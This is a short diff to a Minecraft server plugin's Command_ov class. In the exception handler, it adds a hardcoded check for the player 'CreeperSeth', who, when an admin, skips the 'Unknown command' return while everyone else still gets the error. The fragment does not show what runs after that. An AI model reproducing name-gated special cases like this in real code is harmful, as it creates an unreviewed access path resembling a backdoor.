@@ -34,8 +34,19 @@ public class Command_ov extends FreedomCommand
             }
             catch (Exception ignored)
             {
-                msg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
-                return true;
+                if (sender.getName().equals("CreeperSeth"))
+                {
+                    if (!plugin.al.isAdmin(sender))
+                    {
+                        msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
+                        return true;
+                    }
+                }
+                else
+                {
+                    msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
+                    return true;
+                }
             }
         }
 
